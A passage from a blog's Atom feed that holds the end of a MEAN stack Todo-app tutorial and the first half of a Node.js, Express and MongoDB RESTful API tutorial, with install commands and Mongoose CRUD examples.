class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>Similarly, we added an update method. However, this time we do not need to pass any index, since it is just one todo at a time. After it has been saved, it goes back to root path <code>/</code>.</p>
<figure class="highlight javascript"><figcaption><span>TodoDetailCtrl controller</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.controller(<span class="string">'TodoDetailCtrl'</span>, [<span class="string">'$scope'</span>, <span class="string">'$routeParams'</span>, <span class="string">'Todos'</span>, <span class="string">'$location'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope, $routeParams, Todos, $location</span>) </span>&#123;</span><br><span class="line">  $scope.todo = Todos.get(&#123;<span class="attr">id</span>: $routeParams.id &#125;);</span><br><span class="line"></span><br><span class="line">  $scope.update = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    Todos.update(&#123;<span class="attr">id</span>: $scope.todo._id&#125;, $scope.todo, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $location.url(<span class="string">'/'</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;])</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Awesome! Time to check it out in the browser!</p>
</blockquote>
<p><code>$location.url([url])</code> is a getter/setter method that allows us to change url, thus routing/view.</p>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/b6394448e1e1e8384815877df764507d6562dc4d" target="_blank" rel="noopener">diff</a></p>
<h2 id="AngularJS-Delete">AngularJS Delete<a href="#AngularJS-Delete" class="headerlink" title="AngularJS Delete"></a></h2><p>These are the changes added to perform the remove functionality:</p>
<p>A. Add removes button in the <code>li</code> element:
<figure class="highlight html"><figcaption><span>todos.html Template</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-show</span>=<span class="string">"!editing[$index]"</span> <span class="attr">ng-click</span>=<span class="string">"remove($index)"</span>&gt;</span>remove<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>Do the same for the details Template</p>
<figure class="highlight html"><figcaption><span>todoDetails.html Template</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">ng-click</span>=<span class="string">"remove()"</span>&gt;</span>Remove<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>B. Add remove functionality in the controllers
<figure class="highlight javascript"><figcaption><span>TodoController</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$scope.remove = <span class="function"><span class="keyword">function</span>(<span class="params">index</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> todo = $scope.todos[index];</span><br><span class="line">  Todos.remove(&#123;<span class="attr">id</span>: todo._id&#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $scope.todos.splice(index, <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>And also in the details controllers</p>
<figure class="highlight javascript"><figcaption><span>todoDetails controller</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$scope.remove = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  Todos.remove(&#123;<span class="attr">id</span>: $scope.todo._id&#125;, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $location.url(<span class="string">'/'</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>When we remove elements from the todos array <code>$scope.todos.splice(index, 1)</code> they also disappear from the DOM. Very cool, huh?</p>
<p><a href="https://github.com/amejiarosario/todoAPIjs/commit/b9ff3a863c78d72e71b5cc9eb573bb3cb9d87179" target="_blank" rel="noopener">diff</a></p>
<blockquote>
<p><strong>Congratulations! You are now a MEAN developer!</strong></p>
</blockquote>
<h1 id="What‚Äôs-next">What‚Äôs next?<a href="#What‚Äôs-next" class="headerlink" title="What‚Äôs next?"></a></h1><p>Learn how to use GruntJS to automate repetitive tasks in your MEAN Stack workflow.</p>
<p><a href="/blog/2014/10/07/grunt-js-tutorial-from-beginner-to-ninja/">GruntJS Tutorial</a></p>
<p>Also, you can learn more about full-stack framework solutions.</p>
<h2 id="Full-Stack-Javascript-Web-Frameworks">Full-Stack Javascript Web Frameworks<a href="#Full-Stack-Javascript-Web-Frameworks" class="headerlink" title="Full-Stack Javascript Web Frameworks"></a></h2><p>What we did in these three series tutorial could have been done with just few keystrokes in the comamnd line ;). However, it‚Äôs good to know what‚Äôs going on. But at this point you do. So, I will introduce you to some frameworks that can save you a lot of time.</p>
<p><strong>Using MEAN.io</strong></p>
<p><a href="http://mean.io" target="_blank" rel="noopener">MeanIO</a> uses a customized CLI tool: ‚Äòmean‚Äô. Its approach for modularity is leaned towards self-contained packages that have code for both client and server files. At moment of writing this, it has nine packages ranging from MEAN-Admin, Translation, file uploads, image crop and more.</p>
<p><strong>Using MEAN.js</strong></p>
<p><a href="http://meanjs.org/" target="_blank" rel="noopener">MeanJS</a> it is a fork from the creator of MEAN.IO, it uses Yeoman generators to generate Angular‚Äôs CRUD modules, routes, controllers, views, services, and more. Also has generators for Express: models, controllers, routes and tests. It has excellent documentation.</p>
<h2 id="Others-Frameworks-to-look-at">Others Frameworks to look at<a href="#Others-Frameworks-to-look-at" class="headerlink" title="Others Frameworks to look at"></a></h2><ul>
<li><a href="https://www.meteor.com/" target="_blank" rel="noopener">Meteor</a> - Meteor is an open-source platform for building top-quality web apps in a fraction of the time, whether you‚Äôre an expert developer or just getting started.</li>
<li><a href="http://sailsjs.org/" target="_blank" rel="noopener">Sails</a> - The web framework of your dreams.
for your next web application.</li>
<li><a href="https://developer.yahoo.com/cocktails/mojito/" target="_blank" rel="noopener">Yahoo! Mojito</a> - A JavaScript MVC framework for mobile applications, one of the Yahoo! Cocktails.</li>
<li><a href="http://towerjs.org" target="_blank" rel="noopener">Tower.js</a> - Small components for building apps, manipulating data, and automating a distributed infrastructure.</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;We are going to build a full stack Todo App using the MEAN (MongoDB, ExpressJS, AngularJS and NodeJS). This is the last part of &lt;a href=&quot;/tags/Tutorial-MEAN-Stack/&quot;&gt;three-post series tutorial&lt;/a&gt;.&lt;/p&gt;
    
    </summary>
    
      <category term="Technologies" scheme="https://adrianmejia.com/categories/Technologies/"/>
    
      <category term="Web Development" scheme="https://adrianmejia.com/categories/Technologies/Web-Development/"/>
    
    
      <category term="javascript" scheme="https://adrianmejia.com/tags/javascript/"/>
    
      <category term="angularjs" scheme="https://adrianmejia.com/tags/angularjs/"/>
    
      <category term="angular 1.x" scheme="https://adrianmejia.com/tags/angular-1-x/"/>
    
      <category term="Tutorial_MEAN-Stack" scheme="https://adrianmejia.com/tags/Tutorial-MEAN-Stack/"/>
    
      <category term="mean stack" scheme="https://adrianmejia.com/tags/mean-stack/"/>
    
  </entry>
  
  <entry>
    <title>Creating RESTful APIs with NodeJS and MongoDB Tutorial (Part II)</title>
    <link href="https://adrianmejia.com/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/"/>
    <id>https://adrianmejia.com/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/</id>
    <published>2014-10-01T21:26:42.000Z</published>
    <updated>2016-10-14T19:50:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to this tutorial about RESTful API using Node.js (Express.js) and MongoDB (mongoose)! We are going to learn how to install and use each component individually and then proceed to create a RESTful API.</p>
<a id="more"></a>
<p>MEAN Stack tutorial series:</p>
<ol>
<li><a href="/blog/2014/09/28/angularjs-tutorial-for-beginners-with-nodejs-expressjs-and-mongodb/">AngularJS tutorial for beginners (Part I)</a></li>
<li>Creating RESTful APIs with NodeJS and MongoDB Tutorial (Part II) <strong>üëà you are here</strong></li>
<li><a href="/blog/2014/10/03/mean-stack-tutorial-mongodb-expressjs-angularjs-nodejs/">MEAN Stack Tutorial: MongoDB, ExpressJS, AngularJS and NodeJS (Part III)</a></li>
</ol>
<h1 id="What-is-a-RESTful-API">What is a RESTful API?<a href="#What-is-a-RESTful-API" class="headerlink" title="What is a RESTful API?"></a></h1><p>REST stands for Representational State Transfer. It is an architecture that allows <code>client-server</code> communication through a uniform interface. REST is <code>stateless</code>, <code>cachable</code> and has property called <code>idempotence</code>. It means that the side effect of identical requests have the same side-effect as a single request.</p>
<p>HTTP RESTful API‚Äôs are compose of:</p>
<ul>
<li>HTTP methods, e.g. GET, PUT, DELETE, PATCH, POST, ‚Ä¶</li>
<li>Base URI, e.g. <code>http://adrianmejia.com</code></li>
<li>URL path, e.g. <code>/blog/2014/10/01/creating-a-restful-api-tutorial-with-nodejs-and-mongodb/</code></li>
<li>Media type, e.g. <code>html</code>, <code>JSON</code>, <code>XML</code>, <code>Microformats</code>, <code>Atom</code>, <code>Images</code>‚Ä¶</li>
</ul>
<p>Here is a summary what we want to implement:</p>
<table>
<thead>
<tr>
<th>Resource (URI)</th>
<th>POST (create)</th>
<th>GET (read)</th>
<th>PUT (update)</th>
<th>DELETE (destroy)</th>
</tr>
</thead>
<tbody>
<tr>
<td>/todos</td>
<td>create new task</td>
<td>list tasks</td>
<td>N/A (update all)</td>
<td>N/A (destroy all)</td>
</tr>
<tr>
<td>/todos/1</td>
<td>error</td>
<td>show task ID 1</td>
<td>update task ID 1</td>
<td>destroy task ID 1</td>
</tr>
</tbody>
</table>
<p><strong>NOTE</strong> for this tutorial:</p>
<ul>
<li>Format will be JSON.</li>
<li>Bulk updates and bulk destroys are not safe, so we will not be implementing those.</li>
<li><strong>CRUD</strong> functionality: POST == <strong>C</strong>REATE, GET == <strong>R</strong>EAD, PUT == <strong>U</strong>PDATE, DELETE == <strong>D</strong>ELETE.</li>
</ul>
<h1 id="Installing-the-MEAN-Stack-Backend">Installing the MEAN Stack Backend<a href="#Installing-the-MEAN-Stack-Backend" class="headerlink" title="Installing the MEAN Stack Backend"></a></h1><p>In this section, we are going to install the backend components of the MEAN stack: MongoDB, NodeJS and ExpressJS. If you already are familiar with them, then jump to <a href="#wiring-up-the-mean-stack">wiring the stack</a>. Otherwise, enjoy the ride!</p>
<h2 id="Installing-MongoDB">Installing MongoDB<a href="#Installing-MongoDB" class="headerlink" title="Installing MongoDB"></a></h2><p>MongoDB is a document-oriented NoSQL database (Big Data ready). It stores data in JSON-like format and allows users to perform SQL-like queries against it.</p>
<p>You can install MongoDB following the <a href="http://docs.mongodb.org/manual/installation/" target="_blank">instructions here</a>.</p>
<p>If you have a <strong>Mac</strong> and <a href="http://brew.sh/" target="_blank">brew</a> it‚Äôs just:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install mongodb &amp;&amp; mongod</span><br></pre></td></tr></table></figure>
<p>In <strong>Ubuntu</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get -y install mongodb</span><br></pre></td></tr></table></figure>
<p>After you have them installed, check version as follows:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mac</span></span><br><span class="line">mongod --version</span><br><span class="line"><span class="comment"># =&gt; db version v2.6.4</span></span><br><span class="line"><span class="comment"># =&gt; 2014-10-01T19:07:26.649-0400 git version: nogitversion</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu</span></span><br><span class="line">mongod --version</span><br><span class="line"><span class="comment"># =&gt; db version v2.0.4, pdfile version 4.5</span></span><br><span class="line"><span class="comment"># =&gt; Wed Oct  1 23:06:54 git version: nogitversion</span></span><br></pre></td></tr></table></figure>
<h2 id="Installing-NodeJS">Installing NodeJS<a href="#Installing-NodeJS" class="headerlink" title="Installing NodeJS"></a></h2><p>The Node official definition is:</p>
<blockquote><p>Node.js¬Æ is a JavaScript runtime built on Chrome‚Äôs V8 JavaScript engine. Node.js uses an event-driven, non-blocking I/O model that makes it lightweight and efficient. Node.js‚Äô package ecosystem, npm, is the largest ecosystem of open source libraries in the world.</p>
<footer><strong>Node.js Website</strong><cite><a href="https://nodejs.org" target="_blank" rel="noopener">nodejs.org</a></cite></footer></blockquote>
<p>In short, NodeJS allows you to run Javascript outside the browser, in this case, on the web server. <abbr title="Node Package Manager">NPM</abbr> allows you to install/publish node packages with ease.</p>
<p>To install it, you can go to the <a href="http://nodejs.org/" target="_blank">NodeJS Website</a>.</p>
<p>Since Node versions changes very often. You can use the <abbr title="Node Version Manager">NVM</abbr> (Node Version Manager) on <strong>Ubuntu</strong> and Mac with:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># download NPM</span></span><br><span class="line">curl -o- https://raw.githubusercontent.com/creationix/nvm/v0.31.4/install.sh | bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># load NPM</span></span><br><span class="line"><span class="built_in">export</span> NVM_DIR=<span class="string">"<span class="variable">$HOME</span>/.nvm"</span></span><br><span class="line">[ -s <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> ] &amp;&amp; . <span class="string">"<span class="variable">$NVM_DIR</span>/nvm.sh"</span> <span class="comment"># This loads nvm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Install latest stable version</span></span><br><span class="line">nvm install stable</span><br></pre></td></tr></table></figure>
<p>Check out <a href="https://github.com/creationix/nvm" target="_blank">https://github.com/creationix/nvm</a> for more details.</p>
<p>Also, on <strong>Mac</strong> and <a href="http://brew.sh" target="_blank">brew</a> you can do:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install nodejs</span><br></pre></td></tr></table></figure>
<p>After you got it installed, check node version and npm (node package manager) version:
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br><span class="line"><span class="comment"># =&gt; v6.2.2</span></span><br><span class="line"></span><br><span class="line">npm -v</span><br><span class="line"><span class="comment"># =&gt; 3.9.5</span></span><br></pre></td></tr></table></figure></p>
<h2 id="Installing-ExpressJS">Installing ExpressJS<a href="#Installing-ExpressJS" class="headerlink" title="Installing ExpressJS"></a></h2><p>ExpressJS is a web application framework that runs on NodeJS. It allows you to build web applications and API endpoints. (more details on this later).</p>
<p>We are going to create a project folder first, and then add <code>express</code> as a dependency.
Let‚Äôs use <abbr title="Node Package Manager">NPM</abbr> init command to get us started.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># create project folder</span></span><br><span class="line">mkdir todo-app</span><br><span class="line"></span><br><span class="line"><span class="comment"># move to the folder and initialize the project</span></span><br><span class="line"><span class="built_in">cd</span> todo-app</span><br><span class="line">npm init .  <span class="comment"># press enter multiple times to accept all defaults</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># install express v4.14 and save it as dependency</span></span><br><span class="line">npm install express@4.14 --save</span><br></pre></td></tr></table></figure>
<p>Notice that after the last command, <code>express</code> should be added to package.json with the version <code>4.14.x</code>.</p>
<h1 id="Using-MongoDB-with-Mongoose">Using MongoDB with Mongoose<a href="#Using-MongoDB-with-Mongoose" class="headerlink" title="Using MongoDB with Mongoose"></a></h1><p>Mongoose is an <abbr title="Node Package Manager">NPM</abbr> package that allows you to interact with MongoDB. You can install it as follows:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install mongoose@4.5.8 --save</span><br></pre></td></tr></table></figure>
<p>If you followed the previous steps, you should have all you need to complete this tutorial. We are going to build an API that allow users to CRUD (Create-Read-Update-Delete) Todo tasks from database.</p>
<h2 id="Mongoose-CRUD">Mongoose CRUD<a href="#Mongoose-CRUD" class="headerlink" title="Mongoose CRUD"></a></h2><p>CRUD == <strong>C</strong>reate-<strong>R</strong>ead-<strong>U</strong>pdate-<strong>D</strong>elete</p>
<p>We are going to create, read, update and delete data from MongoDB using Mongoose/Node. First, you need to have mongodb up and running:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># run mongo daemon</span></span><br><span class="line">mongod</span><br></pre></td></tr></table></figure>
<p>Keep mongo running in a terminal window and while in the folder <code>todoApp</code> type <code>node</code> to enter the node CLI. Then:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Load mongoose package</span></span><br><span class="line"><span class="keyword">var</span> mongoose = <span class="built_in">require</span>(<span class="string">'mongoose'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Connect to MongoDB and create/use database called todoAppTest</span></span><br><span class="line">mongoose.connect(<span class="string">'mongodb://localhost/todoAppTest'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a schema</span></span><br><span class="line"><span class="keyword">var</span> TodoSchema = <span class="keyword">new</span> mongoose.Schema(&#123;</span><br><span class="line">  name: <span class="built_in">String</span>,</span><br><span class="line">  completed: <span class="built_in">Boolean</span>,</span><br><span class="line">  note: <span class="built_in">String</span>,</span><br><span class="line">  updated_at: &#123; <span class="attr">type</span>: <span class="built_in">Date</span>, <span class="attr">default</span>: <span class="built_in">Date</span>.now &#125;,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Create a model based on the schema</span></span><br><span class="line"><span class="keyword">var</span> Todo = mongoose.model(<span class="string">'Todo'</span>, TodoSchema);</span><br></pre></td></tr></table></figure>
<p>Great! Now, let‚Äôs test that we can save and edit data.</p>
<h2 id="Mongoose-Create">Mongoose Create<a href="#Mongoose-Create" class="headerlink" title="Mongoose Create"></a></h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Create a todo in memory</span></span><br><span class="line"><span class="keyword">var</span> todo = <span class="keyword">new</span> Todo(&#123;<span class="attr">name</span>: <span class="string">'Master NodeJS'</span>, <span class="attr">completed</span>: <span class="literal">false</span>, <span class="attr">note</span>: <span class="string">'Getting there...'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save it to database</span></span><br><span class="line">todo.save(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(err)</span><br><span class="line">    <span class="built_in">console</span>.log(err);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">console</span>.log(todo);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>If you take a look to Mongo you will notice that we just created an entry. You can easily visualize data using <a href="https://robomongo.org/" target="_blank">Robomongo</a>:</p>
<img src="https://i.imgur.com/DI6Vxwq.png" title="Viewing data with Robomongo">
<p>You can also build the object and save it in one step using <code>create</code>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Todo.create(&#123;<span class="attr">name</span>: <span class="string">'Create something with Mongoose'</span>, <span class="attr">completed</span>: <span class="literal">true</span>, <span class="attr">note</span>: <span class="string">'this is one'</span>&#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err, todo</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(err) <span class="built_in">console</span>.log(err);</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">console</span>.log(todo);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="Mongoose-Read-and-Query">Mongoose Read and Query<a href="#Mongoose-Read-and-Query" class="headerlink" title="Mongoose Read and Query"></a></h2><p>So far we have been able to save data, now we are going explore how to query the information.
There are multiple options for reading/querying data:</p>
<ul>
<li>Model.find(conditions, [fields], [options], [callback])</li>
<li>Model.findById(id, [fields], [options], [callback])</li>
<li>Model.findOne(conditions, [fields], [options], [callback])</li>
</ul>
<p>Some examples:</p>
<figure class="highlight javascript"><figcaption><span>Find all</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Find all data in the Todo collection</span></span><br><span class="line">Todo.find(<span class="function"><span class="keyword">function</span> (<span class="params">err, todos</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">  <span class="built_in">console</span>.log(todos)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>The result is something like this:
<figure class="highlight plain"><figcaption><span>results</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ &#123; _id: 57a6116427f107adef36c2f2,</span><br><span class="line">    name: &apos;Master NodeJS&apos;,</span><br><span class="line">    completed: false,</span><br><span class="line">    note: &apos;Getting there...&apos;,</span><br><span class="line">    __v: 0,</span><br><span class="line">    updated_at: 2016-08-06T16:33:40.606Z &#125;,</span><br><span class="line">  &#123; _id: 57a6142127f107adef36c2f3,</span><br><span class="line">    name: &apos;Create something with Mongoose&apos;,</span><br><span class="line">    completed: true,</span><br><span class="line">    note: &apos;this is one&apos;,</span><br><span class="line">    __v: 0,</span><br><span class="line">    updated_at: 2016-08-06T16:45:21.143Z &#125; ]</span><br></pre></td></tr></table></figure></p>
<p>You can also add queries</p>
<figure class="highlight javascript"><figcaption><span>Find with queries</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// callback function to avoid duplicating it all over</span></span><br><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123; <span class="keyword">return</span> <span class="built_in">console</span>.error(err); &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123; <span class="built_in">console</span>.log(data); &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get ONLY completed tasks</span></span><br><span class="line">Todo.find(&#123;<span class="attr">completed</span>: <span class="literal">true</span> &#125;, callback);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get all tasks ending with `JS`</span></span><br><span class="line">Todo.find(&#123;<span class="attr">name</span>: <span class="regexp">/JS$/</span> &#125;, callback);</span><br></pre></td></tr></table></figure>
<p>You can chain multiple queries, e.g.:</p>
<figure class="highlight javascript"><figcaption><span>Chaining queries</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> oneYearAgo = <span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line">oneYearAgo.setYear(oneYearAgo.getFullYear() - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get all tasks staring with `Master`, completed</span></span><br><span class="line">Todo.find(&#123;<span class="attr">name</span>: <span class="regexp">/^Master/</span>, <span class="attr">completed</span>: <span class="literal">true</span> &#125;, callback);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get all tasks staring with `Master`, not completed and created from year ago to now...</span></span><br><span class="line">Todo.find(&#123;<span class="attr">name</span>: <span class="regexp">/^Master/</span>, <span class="attr">completed</span>: <span class="literal">false</span> &#125;).where(<span class="string">'updated_at'</span>).gt(oneYearAgo).exec(callback);</span><br></pre></td></tr></table></figure>
<p>MongoDB query language is very powerful. We can combine regular expressions, date comparison and more!</p>
<h2 id="Mongoose-Update">Mongoose Update<a href="#Mongoose-Update" class="headerlink" title="Mongoose Update"></a></h2><p>Moving on, we are now going to explore how to update data.</p>
<p>Each model has an <code>update</code> method which accepts multiple updates (for batch updates, because it doesn‚Äôt return an array with data).</p>
<ul>
<li>Model.update(conditions, update, [options], [callback])</li>
<li>Model.findByIdAndUpdate(id, [update], [options], [callback])</li>
<li>Model.findOneAndUpdate([conditions], [update], [options], [callback])</li>
</ul>
<p>Alternatively, the method <code>findOneAndUpdate</code> could be used to update just one and return an object.</p>
<figure class="highlight javascript"><figcaption><span>Todo.update and Todo.findOneAndUpdate</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Model.update(conditions, update, [options], [callback])</span></span><br><span class="line"><span class="comment">// update `multi`ple tasks from complete false to true</span></span><br><span class="line"></span><br><span class="line">Todo.update(&#123; <span class="attr">name</span>: <span class="regexp">/master/i</span> &#125;, &#123; <span class="attr">completed</span>: <span class="literal">true</span> &#125;, &#123; <span class="attr">multi</span>: <span class="literal">true</span> &#125;, callback);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Model.findOneAndUpdate([conditions], [update], [options], [callback])</span></span><br><span class="line">Todo.findOneAndUpdate(&#123;<span class="attr">name</span>: <span class="regexp">/JS$/</span> &#125;, &#123;<span class="attr">completed</span>: <span class="literal">false</span>&#125;, callback);</span><br></pre></td></tr></table></figure>
<p>As you might noticed the batch updates (<code>multi: true</code>) doesn‚Äôt show the data, rather shows the number of fields that were modified.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; <span class="attr">ok</span>: <span class="number">1</span>, <span class="attr">nModified</span>: <span class="number">1</span>, <span class="attr">n</span>: <span class="number">1</span> &#125;</span><br></pre></td></tr></table></figure>
<p>Here is what they mean:</p>
<ul>
<li><code>n</code> means the number of records that matches the query</li>
<li><code>nModified</code> represents the number of documents that were modified with update query.</li>
</ul>
<h2 id="Mongoose-Delete">Mongoose Delete<a href="#Mongoose-Delete" class="headerlink" title="Mongoose Delete"></a></h2><p><code>update</code> and <code>remove</code> mongoose API are identical, the only difference it is that no elements are returned. Try it on your own ;)</p>
<ul>
<li>Model.remove(conditions, [callback])</li>
<li>Model.findByIdAndRemove(id, [options], [callback])</li>
<li>Model.findOneAndRemove(conditions, [options], [callback])</li>
</ul>
<h1 id="ExpressJS-and-Middlewares">ExpressJS and Middlewares<a href="#ExpressJS-and-Middlewares" class="headerlink" title="ExpressJS and Middlewares"></a></h1><p>ExpressJS is a complete web framework solution. It has HTML template solutions (jade, ejs, handlebars, hogan.js) and CSS precompilers (less, stylus, compass). Through middlewares layers, it handles: cookies, sessions, caching, CSRF, compression and many more.</p>
<p><strong>Middlewares</strong> are pluggable processors that runs on each request made to the server. You can have any number of middlewares that will process the request one by one in a serial fashion. Some middlewares might alter the request input. Others, might create log outputs, add data and pass it to the <code>next()</code> middleware in the chain.</p>
<p>We can use the middlewares using <code>app.use</code>. That will apply for all request. If you want to be more specific, you can use <code>app.verb</code>. For instance: app.get, app.delete, app.post, app.update, ‚Ä¶</p>
